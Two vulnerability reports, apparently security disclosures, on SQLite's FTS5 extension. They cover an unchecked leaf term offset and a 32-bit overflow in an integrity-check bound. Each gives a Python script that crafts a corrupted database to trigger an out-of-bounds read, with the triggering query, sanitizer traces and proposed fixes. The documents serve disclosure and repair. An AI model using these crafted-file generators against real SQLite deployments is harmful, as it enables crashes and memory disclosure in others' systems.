Summary
fts5SegIterNextInit() (ext/fts5/fts5_index.c:2833-2836) reads the next leaf page's first pgidx varint into iTermOff, assigns it straight to iLeafOffset with no range check, and calls fts5SegIterLoadTerm(), which dereferences &a[iTermOff] at line 1946. The sibling fts5LeafSeek() validates the identical quantity (if( iOff>n ) FTS5_CORRUPT, line 2568) but this function does not, so an attacker-controlled iTermOff up to 0x7FFFFFFF is dereferenced ~2GB past the ~4KB leaf allocation (CWE-125).

Reproduce
Build the db with the script below. It uses only the real ./sqlite3 CLI to build a tokendata=1 FTS5 table where the token hello appears in every row (so its doclist runs past the first leaf page, taking the iEndofDoclist > szLeaf branch at line 7306 that calls fts5SegIterNextInit). It then patches the raw file, overwriting the target leaf's first pgidx varint (at byte offset szLeaf inside the leaf blob) with FF FF FF FF 07, which decodes to 0x7FFFFFFF. No internal SQLite function is linked.
#!/usr/bin/env python3
import os, subprocess, sys, struct

SQLITE3 = "/data/ylwang/LargeScan/targets/sqlite/sqlite3"
DB = "vuln89.db"
TARGET_ID = (1 << 37) | 2          # %_data id = (segid<<37)|pgno, first leaf of segid 1

def run_sql(sql):
r = subprocess.run([SQLITE3, DB, sql], capture_output=True, text=True)
if r.returncode != 0:
sys.stderr.write("sqlite3 error:\n" + r.stderr)
return r.stdout

if os.path.exists(DB):
os.remove(DB)

run_sql("CREATE VIRTUAL TABLE t USING fts5(a, tokendata=1);")
run_sql(
"BEGIN;"
"WITH RECURSIVE c(i) AS (SELECT 1 UNION ALL SELECT i+1 FROM c WHERE i<1500)"
" INSERT INTO t(a) SELECT 'hello world'||i FROM c;"
"COMMIT;"
)

out = run_sql("SELECT quote(block) FROM t_data WHERE id=%d;" % TARGET_ID).strip()
blob = bytes.fromhex(out[2:-1])
szLeaf = struct.unpack(">H", blob[2:4])[0]       # big-endian u16 at offset 2

patched = bytearray(blob)
patched[szLeaf:szLeaf + 5] = bytes([0xFF, 0xFF, 0xFF, 0xFF, 0x07])   # iTermOff -> 0x7FFFFFFF

data = open(DB, "rb").read()
idx = data.find(blob)
data = data[:idx] + bytes(patched) + data[idx + len(blob):]
open(DB, "wb").write(data)
print("patched leaf szLeaf=%d at file offset %d" % (szLeaf, idx + szLeaf))

The SQL that triggers it (a non-prefix MATCH on the tokendata=1 table routes through fts5SetupTokendataIter):
SELECT count(*) FROM t WHERE t MATCH 'hello';

How to run it (build the db, then open it with the ASAN sqlite3 and run the query):
python3 gen.py
/data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln89.db \
"SELECT count(*) FROM t WHERE t MATCH 'hello';"

ASAN reports SEGV ... READ memory access in sqlite3Fts5GetVarint32, with the backtrace fts5SegIterLoadTerm <- fts5SegIterNextInit <- fts5SetupTokendataIter <- sqlite3Fts5IndexQuery, reached entirely from sqlite3_step of the MATCH query.

Fix/* ext/fts5/fts5_index.c, fts5SegIterNextInit(): validate iTermOff like fts5LeafSeek. */
pIter->iPgidxOff  = pIter->pLeaf->szLeaf;
pIter->iPgidxOff += fts5GetVarint32(&a[pIter->iPgidxOff], iTermOff);
if( iTermOff>pIter->pLeaf->szLeaf ){
p->rc = FTS5_CORRUPT;
}else{
pIter->iLeafOffset = iTermOff;
fts5SegIterLoadTerm(p, pIter, 0);
}

Summary
fts5IndexIntegrityCheckSegment() (ext/fts5/fts5_index.c:8543-8547) computes the bound check if( iOff+nTerm>pLeaf->szLeaf ) in 32-bit signed int, where nTerm is the attacker-controlled leaf first-term length decoded as [0,0x7FFFFFFF]. With nTerm = 0x7FFFFFFF and iOff >= 1, iOff+nTerm overflows to a negative value, so negative > szLeaf is false, the guard is bypassed, and fts5Memcmp(&pLeaf->p[iOff], zIdxTerm, MIN(nTerm,nIdxTerm)) at line 8547 reads nIdxTerm (also attacker-controlled) bytes past the small fts5DataRead buffer (CWE-190 leading to CWE-125). This sharpens the previously reported Vuln82: the iOff+nTerm>szLeaf line proposed there as the fix is itself the overflowing check, so the guard must be done in i64 (compare the sibling fts5IntegrityCheckPgidx() at line 8428, which already uses an i64 offset).

Reproduce
Build the db with the script below. It uses only the real ./sqlite3 CLI to build a valid FTS5 table whose two single-token docs share a 4000-char common prefix (forcing a leaf page, segid=3 pgno=3, whose %_idx split-key blob is 4002 bytes). The 4009-byte leaf block stores locally and contiguously, so two in-place byte patches suffice: the pgidx first-term-offset 0x04 -> 0x7F (first term at offset 127), and the leaf first-term-length varint -> 0x7FFFFFFF. No internal SQLite function is linked.
#!/usr/bin/env python3
import os, subprocess, sys

SQLITE3 = "/data/ylwang/LargeScan/targets/sqlite/sqlite3"
DB = "vuln90.db"

if os.path.exists(DB):
os.remove(DB)

t1 = "c" * 4000
t2 = "c" * 4000 + "d"
sql = (
"CREATE VIRTUAL TABLE t USING fts5(a);\n"
"INSERT INTO t(t, rank) VALUES('pgsz', 64);\n"
"INSERT INTO t VALUES('%s');\n"
"INSERT INTO t VALUES('%s');\n"
"INSERT INTO t(t) VALUES('optimize');\n"
) % (t1, t2)

p = subprocess.run([SQLITE3, DB], input=sql, text=True, capture_output=True)
if p.returncode != 0:
sys.exit("build failed: %s%s" % (p.stdout, p.stderr))

data = bytearray(open(DB, "rb").read())
anchor = bytes.fromhex("000FA89F223063636363")     # rowidoff=0, szLeaf=0x0FA8, term-len 4002
i = data.find(anchor)
start = i - 1                                       # block starts at rowidoff's first 0x00

data[start+4008] = 0x7F                             # pgidx first-term-offset 4 -> 127
data[start+127:start+132] = bytes.fromhex("87ffffff7f")   # leaf first-term-len -> 0x7FFFFFFF

open(DB, "wb").write(data)
print("generated", DB)

The SQL that triggers it (both forms reach the same site):
INSERT INTO t(t) VALUES('integrity-check');
-- or:  PRAGMA integrity_check;

How to run it (build the db, then open it with the ASAN/UBSan sqlite3):
python3 gen.py
/data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln90.db \
"INSERT INTO t(t) VALUES('integrity-check');"

The shipped ./sqlite3 is built with UBSan (-fno-sanitize-recover), which traps the signed overflow at the exact site before the OOB memcmp: runtime error: signed integer overflow: 132 + 2147483647 cannot be represented in type 'int' at fts5IndexIntegrityCheckSegment, with the stack sqlite3Fts5IndexIntegrityCheck <- sqlite3Fts5StorageIntegrity <- fts5SpecialInsert. The overflow and the would-be OOB read are the same code site; the trap pins the CWE-190 root cause.

Fix/* ext/fts5/fts5_index.c, fts5IndexIntegrityCheckSegment():
** perform the bound check in i64 so nTerm cannot overflow it. */
int nTerm = 0;
iOff += fts5GetVarint32(&pLeaf->p[iOff], nTerm);
if( (i64)iOff + (i64)nTerm > pLeaf->szLeaf ){
FTS5_CORRUPT_ROWID(p, iRow);
}else{
res = fts5Memcmp(&pLeaf->p[iOff], zIdxTerm, MIN(nTerm, nIdxTerm));
if( res==0 ) res = nTerm - nIdxTerm;
if( res<0 ) FTS5_CORRUPT_ROWID(p, iRow);
}

